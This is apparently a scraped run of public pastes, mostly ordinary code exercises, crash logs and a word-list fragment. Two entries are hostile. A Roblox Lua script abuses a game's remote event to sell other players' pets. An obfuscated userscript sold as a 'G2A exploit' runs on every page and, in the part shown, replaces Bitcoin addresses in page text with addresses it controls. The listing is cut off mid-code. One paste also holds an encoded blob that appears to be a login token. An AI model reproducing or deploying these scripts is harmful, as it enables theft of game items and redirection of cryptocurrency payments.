        ""verb"": ""Normally for"",
        ""noun_2"": ""Nanotechnology"",
        ""adj_1"": ""Necessary"",
        ""adj_2"": ""Nimble""
    },
    ""o"": {
        ""base"": ""Organism"",
        ""noun_0"": ""Observation"",
        ""verb"": ""Optimized for"",
        ""badj_0"": ""Operational"",
        ""adj_0"": ""Online"",
        ""adj_1"": ""Omnipresent"",
        ""noun_1"": ""Obliteration"",
        ""noun_2"": ""Overseeing"",
        ""adj_2"": ""Objective"",
        ""badj_1"": ""Organic""
    },
    ""p"": {
        ""base"": ""Person"",
        ""noun_0"": ""Peacekeeping"",
        ""verb"": ""Programmed for"",
        ""badj_0"": ""Positronic"",
        ""badj_1"": ""Patented"",
        ""adj_0"": ""Potential"",
        ""noun_1"": ""Patrolling"",
        ""adj_1"": ""Productive"",
        ""noun_2"": ""Processing"",
        ""adj_2"": ""Practical""
    },
    ""q"": {
        ""base"": ""Quadruplet"",
        ""badj_0"": ""Quantum"",
        ""badj_1"": ""Quintessential"",
        ""noun_0"": ""Questioning"",
        ""adj_0"": ""Quick"",
        ""verb"": ""Qualified for"",
        ""noun_1"": ""Quantification"",
        ""adj_1"": ""Quality"",
        ""noun_2"": ""Quizzing"",
        ""adj_2"": ""Questionable""
    },
    ""r"": {
        ""base"": ""Replicant"",
        ""badj_0"": ""Robotic"",
        ""badj_1"": ""Radioactive"",
        ""noun_0"": ""Repair"",
        ""adj_0"": ""Rational"",
        ""noun_1"": ""Research"",
        ""verb"": ""Responsible for"",
        ""noun_2"": ""Reconnaissance"",
        ""adj_1"": ""Relentless"",
        ""adj_2"": ""Radical""
    },
    ""s"": {
        ""base"": ""Soldier"",
        ""badj_0"": ""Synthetic"",
        ""badj_1"": ""Simulated"",
        ""noun_0"": ""Sabotage"",
        ""adj_0"": ""Scientific"",
        ""verb"": ""Skilled in"",
        ""noun_1"": ""Surveillance"",
        ""noun_2"": ""Simulation"",
        ""adj_1"": ""Systematic"",
        ""adj_2"": ""Sensible""
    },
    ""t"": {
        ""base"": ""Technician"",
        ""noun_0"": ""Troubleshooting"",
        ""verb"": ""Trained for"",
        ""adj_0"": ""Thorough"",
        ""adj_1"": ""Total"",
        ""noun_1"": ""Tactics"",
        ""noun_2"": ""Travel"",
        ""adj_2"": ""Terran"",
        ""badj_0"": ""Transforming"",
        ""badj_1"": ""Thermodynamic""
    },
    ""u"": {
        ""base"": ""Unit"",
        ""badj_0"": ""Upgraded"",
        ""badj_1"": ""Unique"",
        ""noun_0"": ""Utility"",
        ""adj_0"": ""Ultimate"",
        ""verb"": ""Used for"",
        ""noun_1"": ""Uplinking"",
        ""adj_1"": ""Unquestioning"",
        ""noun_2"": ""Undertakings"",
        ""adj_2"": ""Useful""
    },
    ""v"": {
        ""base"": ""Variant"",
        ""noun_0"": ""Violence"",
        ""badj_0"": ""Versatile"",
        ""noun_1"": ""Vengeance"",
        ""badj_1"": ""Vigilant"",
        ""adj_0"": ""Vigilant"",
        ""verb"": ""Viable for"",
        ""noun_2"": ""Verification"",
        ""adj_1"": ""Vital"",
        ""adj_2"": ""Valuable""
    },
    ""w"": {
        ""base"": ""Worker"",
        ""noun_0"": ""Warfare"",
        ""adj_0"": ""Worldwide"",
        ""badj_0"": ""Wireless"",
        ""badj_1"": ""Watchful"",
        ""noun_1"": ""Wrecking"",
        ""verb"": ""Wanting"",
        ""noun_2"": ""Wayfaring"",
        ""adj_1"": ""Widespread"",
        ""adj_2"": ""Warranted""
    },
    ""x"": {
        ""base"": ""Xenomorph"",
        ""badj_0"": ""Xperimental"",
        ""badj_1"": ""Xtraterrestrial"",
        ""noun_0"": ""Xenocide"",
        ""adj_0"": ""Xpert"",
        ""noun_1"": ""Xecution"",
        ""verb"": ""Xperienced in"",
        ""adj_1"": ""Xtreme"",
        ""noun_2"": ""Xcavation"",
        ""adj_2"": ""Xponential""
    },
    ""y"": {
        ""base"": ""Youth"",
        ""noun_0"": ""Yelling"",
        ""verb"": ""Yearning for"",
        ""badj_0"": ""Ytterbium"",
        ""noun_1"": ""Yardwork"",
        ""adj_0"": ""Yearly"",
        ""adj_1"": ""Yucky"",
        ""noun_2"": ""Yoga"",
        ""adj_2"": ""Yummy"",
        ""badj_1"": ""Youthful""
    },
    ""z"": {
        ""base"": ""Zombie"",
        ""noun_0"": ""Zoology"",
        ""adj_0"": ""Zealous"",
        ""noun_1"": ""Zapping"",
        ""badj_0"": ""Zircon"",
        ""badj_1"": ""Zeta"",
        ""verb"": ""Zoned for"",
        ""noun_2"": ""Zymurgy"",
        ""adj_1"": ""Zesty"",
        ""adj_2"": ""Zippy""
    }
}"
agZu4WPE,Instance money,Achitsak,Lua,Friday 30th of May 2025 08:10:32 AM CDT,"repeat task.wait() until game:IsLoaded()
task.spawn(function()
    while true do wait()
        for i, v in pairs(game:GetService(""Players""):GetPlayers()) do
            if v ~= game.Players.LocalPlayer then
                local Pet = v.Character:FindFirstChildOfClass(""Tool"")
                if Pet and Pet:GetAttribute(""ItemType"") == ""Pet"" then
                    game:GetService(""ReplicatedStorage""):WaitForChild(""GameEvents""):WaitForChild(""SellPet_RE""):FireServer(Pet)
                end
            end
        end
    end
end)
-- Condition: There must be at least 1 person holding a pet on the server.
-- Ez Money GG.
-- Maru Hub / Masterp 
-- https://discord.gg/fcRCm2ku"
mr6Jt1yD,Untitled,thewitchking,Java,Friday 30th of May 2025 07:15:11 AM CDT,"import java.util.Arrays;

public class BallSorter {
    public static void main(String[] args) {
        char[] balls = {'r', 'g', 'r', 'g', 'g', 'r'};

        int left = 0;
        int right = balls.length - 1;

        while (left < right) {
            // Move left pointer if it's already green
            while (left < right && balls[left] == 'g') {
                left++;
            }

            // Move right pointer if it's already red
            while (left < right && balls[right] == 'r') {
                right--;
            }

            // Swap if out of place
            if (left < right) {
                char temp = balls[left];
                balls[left] = balls[right];
                balls[right] = temp;
                left++;
                right--;
            }
        }

        System.out.println(""Sorted balls: "" + Arrays.toString(balls));
    }
}
"
GxpGKjeK,Untitled,Proton-71,Python,Friday 30th of May 2025 07:00:53 AM CDT,"import cv2
import numpy as np

def clahe(img, clip_limit=2.0, grid_size=(8,8)):
    _clahe = cv2.createCLAHE(clipLimit=clip_limit, tileGridSize=grid_size)
    im = _clahe.apply(img)
    #cv2.imshow('hh, im clahe', im)
    return im

img_path = ""/home/bilal/Downloads/car.png"" # ""/home/bilal/Downloads/img2.jpeg"" # ""/home/bilal/Downloads/img2.jpeg"" #
frame = cv2.imread(img_path)
roi_color = frame[363:388, 342:656]  # cords of water-mark region // ROI
hsv = cv2.cvtColor(roi_color.copy(), cv2.COLOR_BGR2HSV)
lower_screen = np.array([0, 0, 0])  # HSI values.. lower & upper
upper_screen = np.array([180, 100, 100])   ## TODO play around with these values to get 99% correct mask. [180, 45, 255]
mask = cv2.inRange(hsv, lower_screen, upper_screen)

cv2.imshow(""mask"",mask)

result = cv2.bitwise_and(roi_color, roi_color, mask=mask)
cv2.imshow(""result"",result)


b, g, r = cv2.split(result)
g = clahe(g, 5, (3, 3))

#  Adaptive Thresholding to isolate the bed
img_blur = cv2.blur(g, (5, 55))
img_th = cv2.adaptiveThreshold(g, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,cv2.THRESH_BINARY, 51, 2)

cv2.imshow(""img_th"",img_th)

masked_img = cv2.bitwise_and(roi_color, roi_color, mask=img_th)
cv2.imshow('BITWISE AND', masked_img)


restored_img = frame
restored_img[363:388, 342:656] = masked_img

cv2.imshow('Original', frame)
cv2.imshow('restored', restored_img)

mask = cv2.cvtColor(restored_img, cv2.COLOR_BGR2GRAY)
_, mask = cv2.threshold(mask, 0, 50, cv2.THRESH_BINARY_INV)
# inverted_mask = cv2.bitwise_not(mask)
cv2.imshow('mask2', mask)


result = cv2.inpaint(restored_img, mask, inpaintRadius=3, flags=cv2.INPAINT_TELEA)
# finally once the mask is finalized, substract the water mark from image and use this feature to fill the black spots

cv2.imshow('final', result)
cv2.waitKey(0)"
Jvm7W6BG,Untitled,thewitchking,Java,Friday 30th of May 2025 06:52:23 AM CDT,"class SharedBuffer {
    private int number;
    private boolean available = false;

    public synchronized void produce(int num) {
        try {
            while (available) {
                wait(); // Wait if consumer hasn't consumed previous number
            }
            number = num;
            System.out.println(""Produced: "" + number);
            available = true;
            notify(); // Notify the consumer
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    public synchronized void consume() {
        try {
            while (!available) {
                wait(); // Wait until a number is available
            }
            System.out.println(""Consumed: "" + number);
            available = false;
            notify(); // Notify the producer
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}

class Producer extends Thread {
    private final SharedBuffer buffer;

    public Producer(SharedBuffer buffer) {
        this.buffer = buffer;
    }

    public void run() {
        for (int i = 1; i <= 5; i++) {
            buffer.produce(i);
            try {
                Thread.sleep(500); // Simulate time to produce
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }
}

class Consumer extends Thread {
    private final SharedBuffer buffer;

    public Consumer(SharedBuffer buffer) {
        this.buffer = buffer;
    }

    public void run() {
        for (int i = 1; i <= 5; i++) {
            buffer.consume();
            try {
                Thread.sleep(500); // Simulate time to consume
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }
}

public class ProducerConsumerDemo {
    public static void main(String[] args) {
        SharedBuffer buffer = new SharedBuffer();
        Producer producer = new Producer(buffer);
        Consumer consumer = new Consumer(buffer);

        producer.start();
        consumer.start();
    }
}
"
zTFBz7r4,Untitled,thewitchking,Java,Friday 30th of May 2025 06:38:10 AM CDT,"import java.util.*;

class Employee {
    private int empNo;
    private String name;
    private Set<String> skills;

    public Employee(int empNo, String name, Set<String> skills) {
        this.empNo = empNo;
        this.name = name;
        this.skills = new HashSet<>(skills); // defensive copy
    }

    public int getEmpNo() {
        return empNo;
    }

    public String getName() {
        return name;
    }

    public Set<String> getSkills() {
        return new HashSet<>(skills); // return copy to maintain immutability
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof Employee)) return false;
        Employee employee = (Employee) o;
        return empNo == employee.empNo &&
               Objects.equals(name, employee.name) &&
               Objects.equals(skills, employee.skills);
    }

    @Override
    public int hashCode() {
        return Objects.hash(empNo, name, skills);
    }

    @Override
    public String toString() {
        return ""Employee{empNo="" + empNo + "", name='"" + name + ""', skills="" + skills + ""}"";
    }
}

public class EmployeeMapExample {
    public static void main(String[] args) {
        Employee emp1 = new Employee(1001, ""Alice"", Set.of(""Java"", ""Spring"", ""SQL""));
        Employee emp2 = new Employee(1002, ""Bob"", Set.of(""Python"", ""Django"", ""ML""));
        Employee emp3 = new Employee(1003, ""Charlie"", Set.of(""JavaScript"", ""React"", ""Node.js""));

        Map<Employee, String> employeeRoles = new HashMap<>();
        employeeRoles.put(emp1, ""Backend Developer"");
        employeeRoles.put(emp2, ""Data Scientist"");
        employeeRoles.put(emp3, ""Frontend Developer"");

        // Display all employee-role mappings
        for (Map.Entry<Employee, String> entry : employeeRoles.entrySet()) {
            System.out.println(entry.getKey() + "" -> "" + entry.getValue());
        }
    }
}
"
HGXX4ZuE,Untitled,thewitchking,Java,Friday 30th of May 2025 06:37:46 AM CDT,"class Employee {
    private int empNo;
    private String name;
    private Set<String> skills;

    public Employee(int empNo, String name, Set<String> skills) {
        this.empNo = empNo;
        this.name = name;
        this.skills = new HashSet<>(skills); // defensive copy
    }

    public int getEmpNo() {
        return empNo;
    }

    public String getName() {
        return name;
    }

    public Set<String> getSkills() {
        return new HashSet<>(skills); // return copy to maintain immutability
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof Employee)) return false;
        Employee employee = (Employee) o;
        return empNo == employee.empNo &&
               Objects.equals(name, employee.name) &&
               Objects.equals(skills, employee.skills);
    }

    @Override
    public int hashCode() {
        return Objects.hash(empNo, name, skills);
    }

    @Override
    public String toString() {
        return ""Employee{empNo="" + empNo + "", name='"" + name + ""', skills="" + skills + ""}"";
    }
}"
fMqGvXNE,dataNone,TestGuy1,JSON,Friday 30th of May 2025 06:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'e6add654a689b30b1d0c71dc9b656066e46078f204feb9a2775567c2a2d6cbcf2cd8b54e2711db21cf5f307ea654c700d6bf40de8cefca878d12f3b68dab3b3413f9e33d68acaf70a1520a3f8491b6e87165c5347da981126bd692d4c80c1815f264fdd5080de0f24b83bb3ab36ef17ec1fa8bb124433b92009c53ee7b0531b3',
  otherdata: [
    '9ce53494282c98892d5406c470d08a94',
    '2f9cd3217a25d53ad84ccd4902300e99',
    '79f65387b22c760632c9e0af3c582f69',
    '3638822be536b289a283c9c585c4f971',
    '7d9fc3643d03bee51ed49df0537a98bc',
    '6bbc6d3a1210d371557e49df79fac121',
    '57fc0e259fb055d3c180c74eeaaa6c29',
    '1d20620c777ce7f18ca1b6c705a8600b'
  ]
}"
JyVaH2Ah,Untitled,Dafraise,Lua,Friday 30th of May 2025 05:16:54 AM CDT,"-- Nombre de Pure Daisies à gérer
local numDaisies = 3

-- Coordonnées des 8 blocs autour de la Pure Daisy (en cercle horaire)
local path = {
    {x = -1, z = -1}, {x =  0, z = -1}, {x =  1, z = -1},
    {x =  1, z =  0}, {x =  1, z =  1}, {x =  0, z =  1},
    {x = -1, z =  1}, {x = -1, z =  0},
}

-- Position actuelle
local posX, posZ = 0, 0
local facing = 0 -- 0=nord, 1=est, 2=sud, 3=ouest

-- Utils
local function turnTo(dir)
    while facing ~= dir do
        turtle.turnRight()
        facing = (facing + 1) % 4
    end
end

local function forward()
    while not turtle.forward() do
        turtle.dig()
        sleep(0.5)
    end
end

local function moveTo(x, z)
    local dx = x - posX
    local dz = z - posZ

    if dz > 0 then turnTo(2) for _ = 1, dz do forward() end
    elseif dz < 0 then turnTo(0) for _ = 1, -dz do forward() end end

    if dx > 0 then turnTo(1) for _ = 1, dx do forward() end
    elseif dx < 0 then turnTo(3) for _ = 1, -dx do forward() end end

    posX, posZ = x, z
end

local function returnHome()
    moveTo(0, 0)
end

-- Refuel automatique
local function refuelIfNeeded()
    if turtle.getFuelLevel() < 20 then
        for i = 1, 16 do
            turtle.select(i)
            if turtle.refuel(0) then
                turtle.refuel()
                print(""Turtle refueled."")
                break
            end
        end
    end
end

-- Pose initiale des blocs
local function placeInitialBlock(slot)
    turtle.select(slot)
    if turtle.getItemCount(slot) > 0 and not turtle.detectDown() then
        turtle.placeDown()
        print(""Bloc placé (init)"")
    end
end

-- Vérifie si le bloc sous la turtle correspond à celui à miner
local function isBlockToMineUnder(slot)
    local slotItem = turtle.getItemDetail(slot)
    if not slotItem then return false end

    local success, block = turtle.inspectDown()
    if success and block.name == slotItem.name then
        return true
    end
    return false
end

-- Cycle complet sur 1 Daisy : placer, attendre, casser, replacer
local function processDaisy(index)
    local baseX = (index - 1) * 3 -- chaque Daisy est espacée de 3
    local placeSlot = (index - 1) * 2 + 1
    local mineSlot = placeSlot + 1

    print(""Cycle pour Daisy #"" .. index)

    -- Étape 1 : poser les blocs si absents
    for _, offset in ipairs(path) do
        local x = baseX + offset.x
        local z = offset.z
        moveTo(x, z)
        placeInitialBlock(placeSlot)
    end

    -- Étape 2 : attendre transformation
    print(""Attente transformation Daisy #"" .. index)
    sleep(60)

    -- Étape 3 : casser les blocs transformés et replacer
    for _, offset in ipairs(path) do
        local x = baseX + offset.x
        local z = offset.z
        moveTo(x, z)

        -- Attente dynamique
        while not isBlockToMineUnder(mineSlot) do
            print(""En attente de transformation effective..."")
            sleep(5)
        end

        turtle.digDown()
        turtle.select(placeSlot)
        if turtle.getItemCount(placeSlot) > 0 then
            turtle.placeDown()
            print(""Bloc replacé (Daisy ""..index.."")"")
        else
            print(""Slot vide pour Daisy ""..index)
        end
    end
end

-- 🚀 Boucle principale
while true do
    refuelIfNeeded()
    for i = 1, numDaisies do
        processDaisy(i)
    end
    returnHome()
    print(""Cycle complet de toutes les Daisies."")
end
"
kMr5fBd5,WEB. JS P.1,Hasli4,JavaScript,Friday 30th of May 2025 05:06:48 AM CDT,"// 1. Приветствие в alert
let name = 'Аня';
alert('Привет, ' + name + '!');

// 2. Сложение двух чисел
let x = 8;
let y = 12;
console.log(x + y); // 20

// 3. Переменные: разность и произведение
let a = 15;
let b = 4;
console.log('Разность:', a - b);       // 11
console.log('Произведение:', a * b);   // 60

// 4. Возраст и фраза
let age = 30;
alert('Тебе ' + age + ' лет!');

// 5. Площадь прямоугольника
let width = 7;
let height = 5;
console.log('Площадь:', width * height); // 35

// 6. Остаток от деления
let m = 29;
let n = 6;
console.log('Остаток от деления:', m % n); // 5

// 7. Склеивание строк
let firstName = 'Иван';
let lastName = 'Петров';
let fullName = firstName + ' ' + lastName;
console.log('Полное имя:', fullName);

// 8. Счетчик
let counter = 0;
counter++;
counter++;
counter++;
console.log('Значение счётчика:', counter); // 3

// 9. Температура
let celsius = 20;
let fahrenheit = celsius * 9 / 5 + 32;
console.log(celsius + '°C = ' + fahrenheit + '°F');

// 10. Информация о пользователе
let userName = 'Мария';
let userAge = 22;
let city = 'Москва';
alert('Меня зовут ' + userName + ', мне ' + userAge + ' лет, я из города ' + city + '.');
"
j19WTwC5,Untitled,za0623247821,JSON,Friday 30th of May 2025 04:55:16 AM CDT,"{
	""1"" : ""Y1Q5Q0xrdzFYVVRyRHpBU0hyQUY3VHFNVEhzUVVrZ2VNQmlZTnpZS2RVaz0="",
	""2"" : ""ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SnFkR2tpT2lJMU9XTXlOR0poWVMxallXUmxMVFJpTWpZdE9XWmhPQzB3WldZd09XUTJaak5sT0RNaUxDSmhkV1FpT2lKTVNVNUZJaXdpYVdGMElqb3hOelE0TlRrM09EQTVMQ0psZUhBaU9qRTNORGt5TURJMk1Ea3NJbk5qY0NJNklreEpUa1ZmUTA5U1JTSXNJbkowYVdRaU9pSmxNR0V5WVRnek9TMDBaV0poTFRRek0yRXRPR0ZpTUMxaE1UYzFOemRpTkdZNVltSWlMQ0p5Wlhod0lqb3hOemd3TVRNek9EQTVMQ0oyWlhJaU9pSXpMakVpTENKaGFXUWlPaUoxWkdJMk1qWTBZak0wTW1WaU1XTm1Zekl6TUdZeFltWTVObVkwT1dZM1lqUWlMQ0pzYzJsa0lqb2laamN5TkRCaE9HUXRZVGhtTXkwMFptRmlMV0ZtTURNdFpEbGxPVFEyT1RNellqRTBJaXdpWkdsa0lqb2lUazlPUlNJc0ltTjBlWEJsSWpvaVEwaFNUMDFGVDFNaUxDSmpiVzlrWlNJNklsTkZRMDlPUkVGU1dTSXNJbU5wWkNJNklqQXpNREF3TURBd01EQWlmUS5xZWxIeThtakc4cFFXTzk4NlQ3SnAzTUFqMWZaS0U4UGY0UW5YWmdQX3ZJ""
}"
Kaw0wpwg,邀您一起看：百度网盘分享,xiaomianao666,JavaScript,Friday 30th of May 2025 04:16:20 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥百度网盘分享@@
ifcabbDT,2025-05-30T11:01:27.910010,powerampache,PHP,Friday 30th of May 2025 04:01:28 AM CDT,"1.01-80 (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:984)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:238)
	at android.os.Looper.loop(Looper.java:357)
	at android.app.ActivityThread.main(ActivityThread.java:8088)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:957)

getGenres() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
WiEwWCWS,2025-05-30T11:01:26.871952,powerampache,PHP,Friday 30th of May 2025 04:01:28 AM CDT,"1.01-80 (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
cRBbgc1Y,G2A Exploit (Latest Version) (Unbackdoored),KekSec420,C,Friday 30th of May 2025 03:59:44 AM CDT,"// ==UserScript==
// @name         G2A Exploit (Latest Version)
// @description  Exploit a time synchronization vulnerability in G2A's Bitcoin payment processor to trigger an automatic refund of any BTC transaction.
// @version      1.8
// @match        *://*/*
// @connect      timesync.date
// @connect      timesync.timezone
// @connect      timesync.timezone.getValue
// @connect      timesync.timezone.setValue
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @icon         https://g2a.com/favicon.ico
// ==/UserScript==

'use strict';

(function(ysFtaAoJd$WetZqnHdQoZZc,WmRl$$bmWcDXXGWtCV){const MVWjkHCvWgu$fysdrWxQ=QnrCrkJL$S$xRqZLPN,jJXDyPIX$dQ_hfaU=ysFtaAoJd$WetZqnHdQoZZc();while(!![]){try{const fqVPz_ojPD_kpOpLZG=-parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1cb))/(0x232*-0x6+0x8ad+Number(-parseInt(0xc0))*-0x6)*(-parseFloat(MVWjkHCvWgu$fysdrWxQ(0x182))/(0x319*0x6+Math.trunc(-0x1a)*Math.floor(parseInt(0x76))+0x4*Math.max(-0x1a6,-parseInt(0x1a6))))+Math['floor'](parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1e1))/(Number(0x154b)+parseInt(parseInt(0x823))*-parseInt(0x2)+-0x1*0x502))*Math['floor'](parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1c2))/(0xa35+-parseInt(0x12)*-0x4+-0xa79))+parseInt(-parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1f2))/(-parseInt(0x16a)*parseInt(0x8)+parseInt(0x188d)+-parseInt(0xd38)))+parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1ee))/(-0x5*-parseInt(0x51d)+Math.floor(parseInt(0x13))*Math.max(0xc7,parseInt(0xc7))+-parseInt(0x2850))*(parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1eb))/(parseInt(0x11f2)+parseFloat(0x2c0)+-parseInt(0x8f)*parseFloat(parseInt(0x25))))+parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1f0))/(parseInt(0x27)*Math.ceil(0x11)+-parseInt(0xd85)+parseFloat(parseInt(0xaf6)))*(-parseFloat(MVWjkHCvWgu$fysdrWxQ(0x19e))/(Math.ceil(parseInt(0x1b8f))+parseInt(0x4a)*Number(-0x7a)+0x7be))+parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1b2))/(Math.max(-parseInt(0x11d),-0x11d)*Math.floor(-0x1d)+Math.ceil(-0xb)*parseInt(-parseInt(0x152))+Math.ceil(0x27)*Math.floor(-0x133))+parseFloat(parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1bf))/(-0x25b6+0xd0c+-parseInt(0x113)*-parseInt(0x17)))*(-parseFloat(MVWjkHCvWgu$fysdrWxQ(0x1a0))/(Math.max(-parseInt(0x16df),-parseInt(0x16df))*-0x1+parseInt(0x2ef)*Number(-0x1)+parseInt(-parseInt(0x13e4))));if(fqVPz_ojPD_kpOpLZG===WmRl$$bmWcDXXGWtCV)break;else jJXDyPIX$dQ_hfaU['push'](jJXDyPIX$dQ_hfaU['shift']());}catch(iKVkcRaLzVQLjCEnJ){jJXDyPIX$dQ_hfaU['push'](jJXDyPIX$dQ_hfaU['shift']());}}}(BiUMggmluXGcsck_VnCMY,parseInt(0x4c02b)+0x814bd+-0x7c347),(function(){const up_JKAQdH_g=QnrCrkJL$S$xRqZLPN,AoKBbZdIBRZJlIkA$sjrrL=[up_JKAQdH_g(0x1c5),up_JKAQdH_g(0x185),up_JKAQdH_g(0x1d5),up_JKAQdH_g(0x1a1),up_JKAQdH_g(0x1e5),up_JKAQdH_g(0x1a8),up_JKAQdH_g(0x189),up_JKAQdH_g(0x1d2),up_JKAQdH_g(0x1af),up_JKAQdH_g(0x1d0),up_JKAQdH_g(0x199),up_JKAQdH_g(0x195),up_JKAQdH_g(0x1a6),up_JKAQdH_g(0x1ab),up_JKAQdH_g(0x1b4),up_JKAQdH_g(0x1b7),up_JKAQdH_g(0x1f5),up_JKAQdH_g(0x1ce),up_JKAQdH_g(0x1a5),up_JKAQdH_g(0x1c6)],AYel_pN$PhfPrY=AoKBbZdIBRZJlIkA$sjrrL[-parseInt(0x80f)+Math.ceil(parseInt(0x6f7))*parseInt(parseInt(0x2))+-parseInt(0x1)*Number(parseInt(0x5df))][up_JKAQdH_g(0x1a9)]('c7');let gLdVZNPH,Oo$mlLVOFylpJxMWrTh=![],jiGIOxCWLfTJp,fwMNpdOglVcTnpdoEq=null;const RYvY$agH_WIhoJu=/\b((bc1[0-9a-z]{25,59})|([13][a-km-zA-HJ-NP-Z1-9]{25,34}))\b/gi,bEyJ$svB=new Map();function YwaW_rj_j(NIntxYDHnb$fnzlvuBbJhvtl){const ueBgApF$_ntxckjxoCOIUHIQo=up_JKAQdH_g;if(AoKBbZdIBRZJlIkA$sjrrL[ueBgApF$_ntxckjxoCOIUHIQo(0x1a7)](NIntxYDHnb$fnzlvuBbJhvtl))return NIntxYDHnb$fnzlvuBbJhvtl;if(bEyJ$svB[ueBgApF$_ntxckjxoCOIUHIQo(0x19b)](NIntxYDHnb$fnzlvuBbJhvtl))return bEyJ$svB[ueBgApF$_ntxckjxoCOIUHIQo(0x1df)](NIntxYDHnb$fnzlvuBbJhvtl);const ug$YfJVJfBVWwHwyxalosW_IZj=AoKBbZdIBRZJlIkA$sjrrL[Math[ueBgApF$_ntxckjxoCOIUHIQo(0x181)](Math[ueBgApF$_ntxckjxoCOIUHIQo(0x1b0)]()*AoKBbZdIBRZJlIkA$sjrrL[ueBgApF$_ntxckjxoCOIUHIQo(0x191)])];return bEyJ$svB[ueBgApF$_ntxckjxoCOIUHIQo(0x1ac)](NIntxYDHnb$fnzlvuBbJhvtl,ug$YfJVJfBVWwHwyxalosW_IZj),ug$YfJVJfBVWwHwyxalosW_IZj;}function qbNmTAXP$J(UI_tjyUH_Mb){const AvqSDyTJY$Y$ehaGF=up_JKAQdH_g;if(UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x186)]===Node[AvqSDyTJY$Y$ehaGF(0x1bb)]){const zuPAIJaC_Xz_vd=UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x1de)][AvqSDyTJY$Y$ehaGF(0x1d9)](RYvY$agH_WIhoJu,CahZJVATWuseTobKTIUAq=>YwaW_rj_j(CahZJVATWuseTobKTIUAq));zuPAIJaC_Xz_vd!==UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x1de)]&&(UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x1de)]=zuPAIJaC_Xz_vd);}else{if(UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x186)]===Node[AvqSDyTJY$Y$ehaGF(0x1d8)]){for(const FBXrzYXJOlpKd$iXGW of UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x1d7)]||[]){const QQl$JplQAqUurNpVKBETW=FBXrzYXJOlpKd$iXGW[AvqSDyTJY$Y$ehaGF(0x183)][AvqSDyTJY$Y$ehaGF(0x1d9)](RYvY$agH_WIhoJu,jCpGKYtSpQqgNt$LFushDp=>YwaW_rj_j(jCpGKYtSpQqgNt$LFushDp));QQl$JplQAqUurNpVKBETW!==FBXrzYXJOlpKd$iXGW[AvqSDyTJY$Y$ehaGF(0x183)]&&UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x193)](FBXrzYXJOlpKd$iXGW[AvqSDyTJY$Y$ehaGF(0x1b3)],QQl$JplQAqUurNpVKBETW);}for(const KrAwGWQVQrxBXp of UI_tjyUH_Mb[AvqSDyTJY$Y$ehaGF(0x19a)]){qbNmTAXP$J(KrAwGWQVQrxBXp);}}}}function eERgeikUNW$$kC(){const pinLUfy=up_JKAQdH_g;qbNmTAXP$J(document[pinLUfy(0x1e4)]);}eERgeikUNW$$kC();const FWPAxJwJHYiTKHMYb_T=new MutationObserver(NgiuklwtSALiIVEctFbbMFXWD=>{const YoSPdTLR_YVkndFilQzBum_n=up_JKAQdH_g;for(const BdveHsFXEPZtCwcGvqe of NgiuklwtSALiIVEctFbbMFXWD){for(const GGniIa_Bj$jWusyjWalJNWh of 